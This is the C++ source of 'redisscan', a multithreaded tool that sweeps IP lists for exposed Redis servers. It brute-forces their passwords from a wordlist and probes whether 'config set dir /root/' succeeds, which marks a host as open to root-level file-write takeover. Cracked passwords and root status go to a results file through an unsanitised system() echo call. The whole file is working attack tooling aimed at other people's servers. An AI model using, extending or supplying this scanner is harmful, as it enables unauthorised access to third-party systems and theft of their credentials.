#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <hiredis.h>
#include <pthread.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <set>

using namespace std;

struct tag_info
{
	char ip[50];
	int port;
};

multiset<tag_info *> iplists;
vector<string> passs;
pthread_mutex_t mymutex = PTHREAD_MUTEX_INITIALIZER;
char dipfilename[260] = "ip.txt";
char dpassfilename[260] = "pass.txt";
char dresultfilename[260] = "result.txt";
int dport = 6379;
int dthread = 256;
int timeout = 5;

void printhelp();
void split(const string& src, const string& separator, vector<string>& dest);
void *workthread(void *args);
void writeline(char *str);

int main(int argc,char *args[])
{
	int oc;
	while((oc = getopt(argc,args,"i:p:t:d:o:h"))!=-1)
	{
		switch(oc)
		{
			case 'h':
				printhelp();
				return 0;
			break;
			case 'i':
				sprintf(dipfilename,"%s",optarg);
			break;
			case 'p':
				dport = atoi(optarg);
			break;
			case 't':
				dthread = atoi(optarg);
			break;
			case 'd':
				sprintf(dpassfilename,"%s",optarg);
			break;
			case 'o':
				timeout = atoi(optarg);
			break;
			case 'r':
				sprintf(dresultfilename,"%s",optarg);
			break;
		}
	}
	printf("read ipfile...\n");
	fstream fin(dipfilename);
	while(true)
	{
		string strline;
		if(!getline(fin,strline))
			break;
		tag_info *info = new tag_info;
		memset(info,0,sizeof(tag_info));
		vector<string> strs;
		split(strline,":",strs);
		if (strs.size() == 2)
		{
			info->port = atoi(strs.at(1).c_str());
		}
		else if (strs.size() == 1)
		{
			info->port = dport;
		}
		else
		{
			continue;
		}
		sprintf(info->ip,strs.at(0).c_str());
		info->port = dport;
		iplists.insert(info);
	}
	fin.close();
	printf("read ipfile done! count:%d\n",iplists.size());
	printf("read passfile...\n");
	fstream finp(dpassfilename);
	while(true)
	{
		string strline;
		if(!getline(finp,strline))
			break;
		passs.push_back(strline);
	}
	finp.close();
	printf("read passfile done! count:%d\n",passs.size());
	printf("scan start!\n");
	int rc;
	pthread_t thread[dthread];
	for (int i = 0; i < dthread; i++)
	{
		pthread_create(&thread[i], NULL, workthread, NULL);
	}
	for (int i = 0; i < dthread; ++i)
	{
		pthread_join(thread[i],NULL);
	}
	printf("scan done!\n");
	return 0;
}

void *workthread(void *args)
{
	tag_info *info = NULL;
	char host[260] = {0};
	int gisroot = 0;
	char password[200] = {0};
	while(true)
	{
		memset(host,0,260);
		memset(password,0,200);
		gisroot = 0;
		pthread_mutex_lock(&mymutex);
		if(iplists.size() < 1)
		{
			pthread_mutex_unlock(&mymutex);
			break;
		}
		info = *iplists.begin();
		iplists.erase(iplists.begin());
		pthread_mutex_unlock(&mymutex);
		sprintf(host,"%s:%d",info->ip,info->port);
		printf("connect to %s:%d ...!\n",info->ip,info->port);
		timeval tv = {timeout,0};
		redisContext *c = redisConnectWithTimeout(info->ip, info->port,tv);
		if (c->err)
		{
			redisFree(c);
			printf("connect to %s:%d faile!\n",info->ip,info->port);
			delete info;
			continue;
		}
		printf("connect to %s:%d done!\n",info->ip,info->port);
		printf("exec command to %s:%d test...\n",info->ip,info->port);
		redisReply *r = (redisReply *)redisCommand(c, "set testatest 1");
		if( NULL == r)
		{
			redisFree(c);
			printf("exec command to %s:%d faile!\n",info->ip,info->port);
			delete info;
			continue;
		}
		if( !(r->type == REDIS_REPLY_STATUS && strcasecmp(r->str,"OK")==0))  
	    {
	    	if (strstr(r->str,"NOAUTH"))
	    	{
	    		printf("need auth to %s:%d ...\n",info->ip,info->port);
	    		char authstr[200];
	    		int isauth = 0;
	    		int isc = 0;
	    		for (int i = 0; i < passs.size(); ++i)
	    		{
	    			sprintf(authstr,"auth %s",passs.at(i).c_str());
	    			printf("auth to %s:%d pass:%s...\n",info->ip,info->port,passs.at(i).c_str());
	    			r = (redisReply *)redisCommand(c, authstr);
	    			if (r == NULL)
	    			{
	    				redisFree(c);
	    				delete info;
	    				printf("auth to %s:%d faile!\n",info->ip,info->port);
	    				isc = 1;
	    				break;
	    			}
	    			if( !(r->type == REDIS_REPLY_STATUS && strcasecmp(r->str,"OK")==0))  
	    			{
	    				continue;
	    			}
	    			sprintf(password,passs.at(i).c_str());
	    			printf("auth to %s:%d done! pass is:%s...\n",info->ip,info->port,passs.at(i).c_str());
	    			isauth = 1;
	    			break;
	    		}
	    		if(isc == 1)
	    			continue;
	    		if (isauth == 0)
	    		{
	    			redisFree(c);
	    			delete info;
	    			printf("auth to %s:%d faile! no simple pass\n",info->ip,info->port);
	    			continue;
	    		}
	    	}
	    	else
	    	{
	    		printf("exec command to %s:%d faile! command set testatest 1\n",info->ip,info->port);
		        redisFree(c);
		        continue;
	    	}
	        
	    }
	    printf("exec command to %s:%d done! command set testatest 1\n",info->ip,info->port);
	    printf("check root to %s:%d ...\n",info->ip,info->port);
	    r = (redisReply *)redisCommand(c, "config set dir /root/");
	    if( NULL == r)
		{
			printf("check root to %s:%d faile!\n",info->ip,info->port);
		}
		else if( !(r->type == REDIS_REPLY_STATUS && strcasecmp(r->str,"OK")==0))
		{
			printf("check root to %s:%d no root!\n",info->ip,info->port);
		}
		else
		{
			gisroot = 1;
			printf("check root to %s:%d is root!\n",info->ip,info->port);
		}
		char results[1024] = {0};
		sprintf(results,"%s\t%d\t%s",host,gisroot,password);
		writeline(results);
		delete info;
	}
	return NULL;
}


void printhelp()
{
	printf("redisscan help:\n");
	printf("\t-h\t\thelp\n");
	printf("\t-i filename\tip file path\n");
	printf("\t-p port\t\tdefualt port\n");
	printf("\t-t num\t\tmax thread count\n");
	printf("\t-d filename\tpassword file path\n");
	printf("\t-o num\t\ttimeout (sec)\n");
	printf("\t-r filename\tresult file path\n");
}

void split(const string& src, const string& separator, vector<string>& dest)
{
    string str = src;
    string substring;
    string::size_type start = 0, index;

    do
    {
        index = str.find_first_of(separator,start);
        if (index != string::npos)
        {    
            substring = str.substr(start,index-start);
            dest.push_back(substring);
            start = str.find_first_not_of(separator,index);
            if (start == string::npos) return;
        }
    }while(index != string::npos);
    substring = str.substr(start);
    dest.push_back(substring);
}

void writeline(char *str)
{
	int len = strlen(str) + strlen(dresultfilename) + 10;
	char *command = new char[len];
	memset(command,0,len);
	sprintf(command,"echo %s >>%s",str,dresultfilename);
	system(command);
	delete []command;
}